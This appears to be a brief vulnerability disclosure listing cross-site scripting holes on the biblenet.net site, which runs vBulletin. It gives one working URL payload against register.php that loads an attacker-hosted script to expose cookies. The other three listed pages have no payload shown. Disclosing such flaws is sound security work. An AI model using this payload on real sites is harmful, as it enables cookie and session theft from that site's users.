Subject: Biblenet.net - XSS


Biblenet.net

Homepage:
http://www.biblenet.net

Affected files:
gettinginvolved.html
register.php
member.php
/library/index.html
-----------------------------------------

Biblespace uses vBulletin for most of their site, so most of these vulns are based in the vbulletin site themselves, which others have probably found before.

XSS vuln with cookie disclosure via gettingInvolved.html:

XSS vuln with cookie disclosure via register.php:
http://www.biblenet.net/forums/register.php?s=\\">">">">">"><SCRIPT%20SRC=http://youfucktard.com/xss.js></SCRIPT><"<"<"<"&action=signup


XSS vuln with cookie disclosure via member.php when editing profile, this time after we've logged in:

Same XSS vuln above, this time on /library/index.html:
